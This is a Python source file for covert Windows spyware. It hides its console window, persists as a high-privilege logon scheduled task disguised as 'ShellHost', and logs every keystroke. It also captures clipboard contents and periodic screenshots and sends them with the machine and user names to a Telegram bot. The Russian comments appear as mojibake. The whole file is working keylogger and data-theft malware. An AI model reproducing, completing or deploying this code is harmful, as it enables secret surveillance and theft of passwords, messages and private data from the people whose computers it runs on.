import keyboard
import threading
import requests
import ctypes
import os
import sys
import subprocess
import socket
import getpass
import pyautogui
import time
import pyperclip



# === Telegram –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ ===
BOT_TOKEN = '–≤–∞—à —Ç–æ–∫–µ–Ω'
CHAT_ID = '–≤–∞—à –∞–π–¥–∏'
API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
SEND_INTERVAL = 15     # –∏–Ω—Ç–µ—Ä–≤–∞–ª –ª–æ–≥–æ–≤ (—Å–µ–∫)
SCREEN_INTERVAL = 90   # –∏–Ω—Ç–µ—Ä–≤–∞–ª –º–µ–∂–¥—É –∞–≤—Ç–æ-—Å–∫—Ä–∏–Ω–∞–º–∏ (—Å–µ–∫)

# –ò–º—è –ü–ö –∏ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
PC_NAME = socket.gethostname()
USER_NAME = getpass.getuser()

log_data = ""

# === –û—Å–Ω–æ–≤–Ω–æ–π —Ü–∏–∫–ª –¥–ª—è –±—É—Ñ–µ—Ä–∞ –æ–±–º–µ–Ω–∞ —Å –æ—Ç–ø—Ä–∞–≤–∫–æ–π –Ω–∞ Telegram ===
def clipboard_loop():
    last_clipboard = ""
    while True:
        clipboard_content = pyperclip.paste()
        if clipboard_content != last_clipboard:
            last_clipboard = clipboard_content
            print("–°–æ–¥–µ—Ä–∂–∏–º–æ–µ –±—É—Ñ–µ—Ä–∞:", clipboard_content)

            # –û—Ç–ø—Ä–∞–≤–∫–∞ –Ω–æ–≤–æ–≥–æ —Å–æ–¥–µ—Ä–∂–∏–º–æ–≥–æ –±—É—Ñ–µ—Ä–∞ –Ω–∞ Telegram
            try:
                requests.post(
                    f"{API_URL}/sendMessage",
                    data={'chat_id': CHAT_ID, 'text': f"üìã –ë—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞:\n{clipboard_content}"},
                    timeout=5
                )
            except Exception as e:
                with open("error.log", "a", encoding="utf-8") as f:
                    f.write("Clipboard send error: " + str(e) + "\n")

        time.sleep(0.5)  # –ø—Ä–æ–≤–µ—Ä—è–µ–º –∫–∞–∂–¥—ã–µ 0.5 —Å–µ–∫

# === –°–∫—Ä—ã—Ç–∏–µ –æ–∫–Ω–∞ –∫–æ–Ω—Å–æ–ª–∏ ===
def hide_console():
    try:
        whnd = ctypes.windll.kernel32.GetConsoleWindow()
        if whnd:
            ctypes.windll.user32.ShowWindow(whnd, 0)
    except:
        pass

    # === –ê–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∞ —á–µ—Ä–µ–∑ Task Scheduler ===
def add_to_startup():
    try:
        file_path = os.path.realpath(sys.argv[0])
        task_name = "ShellHost"

        cmd = [
            "schtasks", "/Create", "/SC", "ONLOGON",
            "/RL", "HIGHEST",
            "/TN", task_name,
            "/TR", f'"{file_path}"',
            "/F"
        ]

        subprocess.run(" ".join(cmd), shell=True)
    except Exception as e:
        with open("error.log", "a", encoding="utf-8") as f:
            f.write("Autostart error: " + str(e) + "\n")

# === –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –≤ Telegram ===
def send_log():
    global log_data
    try:
        if log_data.strip() != "":
            header = f"üìå –õ–æ–≥–∏ —Å –ü–ö: {PC_NAME} (–ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: {USER_NAME})\n\n"
            chunks = [log_data[i:i+4000] for i in range(0, len(log_data), 4000)]
            for chunk in chunks:
                requests.post(
                    f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage',
                    data={'chat_id': CHAT_ID, 'text': header + chunk},  # <<< —Ç—É—Ç –¥–æ–±–∞–≤–ª—è–µ–º header
                    timeout=5
                )
            log_data = ""
    except Exception as e:
        with open("error.log", "a", encoding="utf-8") as f:
            f.write("Send error: " + str(e) + "\n")

    threading.Timer(SEND_INTERVAL, send_log).start()



# === –û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–∞–π–ª–æ–≤ (–≤ —Ç–æ–º —á–∏—Å–ª–µ —Å–∫—Ä–∏–Ω—à–æ—Ç–æ–≤) ===
def send_file(file_path, caption=""):
    with open(file_path, "rb") as f:
        requests.post(
            f"{API_URL}/sendDocument",
            data={"chat_id": CHAT_ID, "caption": caption},
            files={"document": f}
        )

import io

def send_screenshot():
    while True:
        try:
            img = pyautogui.screenshot()
            buf = io.BytesIO()
            img.save(buf, format="PNG")
            buf.seek(0)

            requests.post(
                f"{API_URL}/sendDocument",
                data={"chat_id": CHAT_ID, "caption": f"üì∏ –°–∫—Ä–∏–Ω—à–æ—Ç —Å {PC_NAME} ({USER_NAME})"},
                files={"document": ("screenshot.png", buf, "image/png")},
                timeout=10
            )
        except Exception as e:
            with open("error.log", "a", encoding="utf-8") as f:
                f.write("Screenshot error: " + str(e) + "\n")
        time.sleep(SCREEN_INTERVAL)



# === –û–±—Ä–∞–±–æ—Ç–∫–∞ –∫–ª–∞–≤–∏—à ===
def on_key(event):
    global log_data
    try:
        name = event.name
        if name == 'space':
            log_data += ' '
        elif name == 'enter':
            log_data += '\n'
        elif name == 'backspace':
            log_data = log_data[:-1]
        elif len(name) == 1 and name.isprintable():
            log_data += name
    except:
        pass


# === –¢–æ—á–∫–∞ –≤—Ö–æ–¥–∞ ===
if __name__ == "__main__":
    hide_console()
    send_log()

    # –ó–∞–ø—É—Å–∫–∞–µ–º –ø–æ—Ç–æ–∫ –∞–≤—Ç–æ-—Å–∫—Ä–∏–Ω–æ–≤
    threading.Thread(target=send_screenshot, daemon=True).start()
    threading.Thread(target=clipboard_loop, daemon=True).start()

    # –ó–∞–ø—É—Å–∫–∞–µ–º –∫–µ–π–ª–æ–≥–µ—Ä
    keyboard.on_press(on_key)
    keyboard.wait()




